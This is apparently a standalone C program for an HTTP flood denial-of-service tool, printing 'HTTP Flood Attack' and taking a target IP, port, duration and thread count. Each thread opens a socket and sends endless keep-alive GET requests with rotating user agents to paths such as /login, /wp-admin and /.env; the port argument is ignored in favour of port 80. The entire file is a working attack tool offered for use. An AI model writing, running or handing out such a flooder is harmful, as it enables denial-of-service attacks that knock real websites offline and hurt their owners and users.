#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

volatile int running = 1;
unsigned long long total_requests = 0;

char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
};

char *paths[] = { "/", "/api", "/login", "/wp-admin", "/.env", "/config" };

void *attack_thread(void *arg) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in dest;
    char *ip = (char*)arg;
    int port = 80;
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(ip);
    
    connect(sock, (struct sockaddr*)&dest, sizeof(dest));
    
    char request[1024];
    while (running) {
        int ua_idx = rand() % 3;
        int path_idx = rand() % 6;
        
        snprintf(request, sizeof(request),
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n\r\n",
            paths[path_idx], ip, user_agents[ua_idx]);
        
        send(sock, request, strlen(request), 0);
        total_requests++;
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, exit);
    srand(time(NULL));
    
    if (argc < 4) {
        printf("HTTP Flood: ./http_leak <IP> <PORT> <TIME> [THREADS]\n");
        return 1;
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc >= 5) ? atoi(argv[4]) : 200;
    
    printf("\n🔥 HTTP Flood Attack\n🎯 %s:%d\n⏱️ %ds\n🔧 %d threads\n\n", ip, port, duration, threads);
    
    pthread_t t[threads];
    for (int i = 0; i < threads; i++)
        pthread_create(&t[i], NULL, attack_thread, ip);
    
    sleep(duration);
    running = 0;
    for (int i = 0; i < threads; i++)
        pthread_join(t[i], NULL);
    
    printf("\n✅ Complete! Requests: %llu\n", total_requests);
    return 0;
}